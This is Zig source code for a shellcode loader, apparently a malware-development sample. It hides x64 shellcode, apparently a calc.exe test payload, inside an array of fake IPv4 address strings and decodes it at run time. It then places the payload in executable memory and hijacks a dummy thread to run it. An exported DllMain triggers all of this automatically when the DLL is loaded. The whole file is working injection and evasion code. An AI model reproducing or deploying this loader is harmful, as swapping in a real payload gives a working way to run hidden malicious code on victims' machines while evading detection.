const std = @import("std");
const win = @import("zigwin32").everything;
const sec = @import("zig-sec");

const payload_obfuscation = sec.payload_obfuscation;
const code_injection = sec.code_injection;

const HINSTANCE = win.HINSTANCE;
const PVOID = *anyopaque;
const BOOL = win.BOOL;

const DLL_PROCESS_ATTACH = win.DLL_PROCESS_ATTACH;
const DLL_THREAD_ATTACH = win.DLL_THREAD_ATTACH;
const DLL_THREAD_DETACH = win.DLL_THREAD_DETACH;
const DLL_PROCESS_DETACH = win.DLL_PROCESS_DETACH;

const CreateThread = win.CreateThread;
const CloseHandle = win.CloseHandle;
const GetLastError = win.GetLastError;

const ipv4_array = [_][:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0" };

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shell_code = try payload_obfuscation.ipv4.deobfuscate(allocator, &ipv4_array);
    defer allocator.free(shell_code);

    // Dummy Thread
    _ = CreateThread(
        null,
        0,
        @ptrCast(&dummyFunction),
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };

    std.time.sleep(std.time.ns_per_s * 5);

    const h_thread = try sec.thread.getFirstNonMainThreadHandleInCurrentProcess();
    defer _ = CloseHandle(h_thread);

    const shell_code_region = try code_injection.local.allocateExecutableMemory(shell_code);
    try sec.thread.hijackThread(h_thread, shell_code_region, true);
}

pub export fn DllMain(hinstDLL: HINSTANCE, fdwReason: u32, lpReserved: PVOID) BOOL {
    _ = lpReserved;
    _ = hinstDLL;
    switch (fdwReason) {
        DLL_PROCESS_ATTACH => {
            main() catch return 0;
        },
        DLL_THREAD_ATTACH => {},
        DLL_THREAD_DETACH => {},
        DLL_PROCESS_DETACH => {},
        else => {},
    }
    return 1;
}

fn dummyFunction() void {
    while (true) {
        std.debug.print("We are in the dummy function\n", .{});
        std.time.sleep(std.time.ns_per_s * 2);
    }
}
